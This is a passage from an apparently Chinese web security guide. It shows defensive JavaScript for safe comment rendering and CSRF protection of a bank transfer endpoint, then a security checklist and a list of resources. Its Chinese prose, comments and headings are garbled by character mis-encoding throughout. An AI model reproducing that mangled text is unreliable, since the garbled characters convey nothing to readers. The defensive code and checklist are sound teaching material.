// å‰ç«¯å®‰å…¨æ˜¾ç¤º
function displayComments(comments) {
  const container = document.getElementById('comments');

  // ä½¿ç”¨å®‰å…¨çš„DOMæ“ä½œ
  container.innerHTML = '';

  comments.forEach(comment => {
    const div = document.createElement('div');
    div.className = 'comment';

    const p = document.createElement('p');
    p.textContent = comment.comment; // å®‰å…¨ï¼šä½¿ç”¨textContent

    const span = document.createElement('span');
    span.textContent = comment.createdAt;

    div.appendChild(p);
    div.appendChild(span);
    container.appendChild(div);
  });
}
```

### æ¡ˆä¾‹2ï¼šé“¶è¡Œç³»ç»ŸCSRFæ”»å‡»é˜²æŠ¤

**åœºæ™¯**ï¼šç½‘é“¶è½¬è´¦åŠŸèƒ½çš„CSRFé˜²æŠ¤

**å®Œæ•´é˜²æŠ¤æ–¹æ¡ˆ**ï¼š
```javascript
// åç«¯å®ç°
const express = require('express');
const session = require('express-session');
const crypto = require('crypto');

const app = express();

// ä¼šè¯é…ç½®
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true, // HTTPS only
    httpOnly: true,
    maxAge: 30 * 60 * 1000, // 30åˆ†é’Ÿ
    sameSite: 'strict'
  }
}));

// CSRF Tokenç”Ÿæˆ
function generateCSRFToken() {
  return crypto.randomBytes(32).toString('hex');
}

// è·å–CSRF Token
app.get('/api/csrf-token', (req, res) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCSRFToken();
  }

  res.json({ token: req.session.csrfToken });
});

// CSRFéªŒè¯ä¸­é—´ä»¶
function validateCSRF(req, res, next) {
  const token = req.headers['x-csrf-token'] || req.body.csrfToken;
  const sessionToken = req.session.csrfToken;

  if (!token || !sessionToken || token !== sessionToken) {
    return res.status(403).json({
      error: 'CSRFéªŒè¯å¤±è´¥',
      code: 'CSRF_INVALID'
    });
  }

  // æ¯æ¬¡ä½¿ç”¨åé‡æ–°ç”Ÿæˆtokenï¼ˆä¸€æ¬¡æ€§tokenï¼‰
  req.session.csrfToken = generateCSRFToken();

  next();
}

// å®‰å…¨çš„è½¬è´¦æ¥å£
app.post('/api/transfer', validateCSRF, async (req, res) => {
  try {
    const { toAccount, amount, password } = req.body;
    const user = req.session.user;

    // 1. ç”¨æˆ·è®¤è¯æ£€æŸ¥
    if (!user) {
      return res.status(401).json({ error: 'æœªç™»å½•' });
    }

    // 2. å¯†ç äºŒæ¬¡éªŒè¯
    const isValidPassword = await verifyPassword(user.id, password);
    if (!isValidPassword) {
      return res.status(401).json({ error: 'å¯†ç é”™è¯¯' });
    }

    // 3. ä¸šåŠ¡è§„åˆ™éªŒè¯
    if (amount <= 0 || amount > user.balance) {
      return res.status(400).json({ error: 'è½¬è´¦é‡‘é¢æ— æ•ˆ' });
    }

    // 4. æ‰§è¡Œè½¬è´¦
    const result = await executeTransfer(user.account, toAccount, amount);

    // 5. è®°å½•æ“ä½œæ—¥å¿—
    logSecurityEvent('TRANSFER', {
      from: user.account,
      to: toAccount,
      amount: amount
    }, req);

    res.json({
      success: true,
      transactionId: result.id,
      newCSRFToken: req.session.csrfToken // è¿”å›æ–°çš„token
    });

  } catch (error) {
    logger.error('Transfer error:', error);
    res.status(500).json({ error: 'è½¬è´¦å¤±è´¥' });
  }
});

// å‰ç«¯å®ç°
class SecureBankingClient {
  constructor() {
    this.csrfToken = null;
    this.init();
  }

  async init() {
    await this.refreshCSRFToken();
  }

  async refreshCSRFToken() {
    try {
      const response = await fetch('/api/csrf-token', {
        credentials: 'include'
      });
      const data = await response.json();
      this.csrfToken = data.token;
    } catch (error) {
      console.error('è·å–CSRF Tokenå¤±è´¥:', error);
    }
  }

  async secureRequest(url, data) {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': this.csrfToken
      },
      body: JSON.stringify(data),
      credentials: 'include'
    });

    const result = await response.json();

    // æ›´æ–°CSRF Token
    if (result.newCSRFToken) {
      this.csrfToken = result.newCSRFToken;
    }

    return result;
  }

  async transfer(toAccount, amount, password) {
    try {
      const result = await this.secureRequest('/api/transfer', {
        toAccount,
        amount,
        password
      });

      if (result.success) {
        alert('è½¬è´¦æˆåŠŸï¼');
      } else {
        alert('è½¬è´¦å¤±è´¥ï¼š' + result.error);
      }
    } catch (error) {
      console.error('è½¬è´¦è¯·æ±‚å¤±è´¥:', error);
      alert('ç½‘ç»œé”™è¯¯ï¼Œè¯·é‡è¯•');
    }
  }
}

// ä½¿ç”¨ç¤ºä¾‹
const bankClient = new SecureBankingClient();

document.getElementById('transferForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const formData = new FormData(e.target);
  await bankClient.transfer(
    formData.get('toAccount'),
    parseFloat(formData.get('amount')),
    formData.get('password')
  );
});
```

---

## âœ… å®‰å…¨æ£€æŸ¥æ¸…å• {#security-checklist}

### å‰ç«¯å®‰å…¨æ£€æŸ¥æ¸…å•

#### è¾“å…¥éªŒè¯
- [ ] æ‰€æœ‰ç”¨æˆ·è¾“å…¥éƒ½ç»è¿‡éªŒè¯å’Œè¿‡æ»¤
- [ ] ä½¿ç”¨ç™½åå•è€Œéé»‘åå•è¿›è¡Œè¿‡æ»¤
- [ ] å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯éƒ½è¿›è¡ŒéªŒè¯
- [ ] é™åˆ¶è¾“å…¥é•¿åº¦å’Œæ ¼å¼

#### XSSé˜²æŠ¤
- [ ] ä½¿ç”¨textContentè€ŒéinnerHTML
- [ ] å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡ŒHTMLç¼–ç 
- [ ] å®æ–½å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰
- [ ] é¿å…ä½¿ç”¨eval()å’Œç±»ä¼¼å‡½æ•°
- [ ] è®¾ç½®HttpOnly Cookie

#### CSRFé˜²æŠ¤
- [ ] ä½¿ç”¨CSRF TokenéªŒè¯
- [ ] è®¾ç½®SameSite Cookieå±æ€§
- [ ] éªŒè¯Refererå¤´éƒ¨
- [ ] æ•æ„Ÿæ“ä½œä½¿ç”¨POSTè¯·æ±‚

#### èº«ä»½è®¤è¯
- [ ] ä½¿ç”¨å¼ºå¯†ç ç­–ç•¥
- [ ] å®æ–½å¤šå› ç´ è®¤è¯
- [ ] Tokenæœ‰åˆç†çš„è¿‡æœŸæ—¶é—´
- [ ] å®‰å…¨å­˜å‚¨ç”¨æˆ·å‡­æ®

#### æ•°æ®ä¿æŠ¤
- [ ] ä½¿ç”¨HTTPSä¼ è¾“
- [ ] æ•æ„Ÿæ•°æ®åŠ å¯†å­˜å‚¨
- [ ] æœ€å°æƒé™åŸåˆ™
- [ ] å®šæœŸæ¸…ç†æ•æ„Ÿæ•°æ®

#### é…ç½®å®‰å…¨
- [ ] è®¾ç½®å®‰å…¨HTTPå¤´éƒ¨
- [ ] ç¦ç”¨ä¸å¿…è¦çš„HTTPæ–¹æ³•
- [ ] éšè—æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯
- [ ] å®šæœŸæ›´æ–°ä¾èµ–åŒ…

#### ç›‘æ§å’Œæ—¥å¿—
- [ ] è®°å½•å®‰å…¨ç›¸å…³äº‹ä»¶
- [ ] å®æ–½å…¥ä¾µæ£€æµ‹
- [ ] å®šæœŸå®‰å…¨å®¡è®¡
- [ ] å»ºç«‹åº”æ€¥å“åº”è®¡åˆ’

---

## ğŸ”— ç›¸å…³èµ„æº

### å®˜æ–¹æ–‡æ¡£
- [OWASP Webå®‰å…¨æŒ‡å—](https://owasp.org/www-project-web-security-testing-guide/)
- [MDN Webå®‰å…¨](https://developer.mozilla.org/en-US/docs/Web/Security)
- [Content Security Policyå‚è€ƒ](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### å®‰å…¨å·¥å…·
- **ä»£ç æ‰«æ**: ESLint Security Plugin, SonarQube
- **ä¾èµ–æ£€æŸ¥**: npm audit, Snyk, WhiteSource
- **æ¸—é€æµ‹è¯•**: OWASP ZAP, Burp Suite
- **å†…å®¹è¿‡æ»¤**: DOMPurify, validator.js

### å­¦ä¹ èµ„æº
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Webå®‰å…¨å­¦é™¢](https://portswigger.net/web-security)
- [Google Webå®‰å…¨åŸºç¡€](https://web.dev/security/)

---

**âš ï¸ é‡è¦æé†’**ï¼š
- å®‰å…¨æ˜¯ä¸€ä¸ªæŒç»­çš„è¿‡ç¨‹ï¼Œéœ€è¦å®šæœŸæ›´æ–°å’Œæ”¹è¿›
- æœ¬æ–‡æ¡£æä¾›çš„æ˜¯åŸºç¡€é˜²æŠ¤ç­–ç•¥ï¼Œå®é™…åº”ç”¨ä¸­éœ€è¦æ ¹æ®å…·ä½“åœºæ™¯è°ƒæ•´
- å»ºè®®å®šæœŸè¿›è¡Œå®‰å…¨å®¡è®¡å’Œæ¸—é€æµ‹è¯•
- ä¿æŒå¯¹æœ€æ–°å®‰å…¨å¨èƒå’Œé˜²æŠ¤æŠ€æœ¯çš„å…³æ³¨

ğŸ“ *æœ€åæ›´æ–°ï¼š2025å¹´9æœˆ17æ—¥*